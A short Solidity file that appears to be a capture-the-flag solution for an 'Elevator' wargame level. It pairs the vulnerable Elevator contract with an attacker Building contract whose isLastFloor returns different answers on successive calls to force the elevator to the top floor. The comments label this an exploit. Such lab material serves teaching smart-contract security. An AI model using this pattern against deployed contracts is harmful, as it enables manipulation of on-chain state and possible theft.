// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/* Contract initially has this interface
interface Building {
    function isLastFloor(uint) external returns (bool);
}
*/

contract Elevator{
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(_floor);
        }
    }
}

contract Building {
    bool public lastFloor = false;
    Elevator elevator;

    constructor(address _elevatorAddress) public {
        elevator = Elevator(_elevatorAddress);
    }

    // custom malicious implementation that will abuse the elevator contract above
    // structure has to mirror the interface structure to work
    function isLastFloor(uint) external returns (bool) {
        if (!lastFloor) {
            lastFloor = true;
            return false;
        } else {
            lastFloor = false;
            return true;
        }
    }

    // function to call Elevator's goTo function and run the exploit
    function ascend() public {
        elevator.goTo(1);
    }
}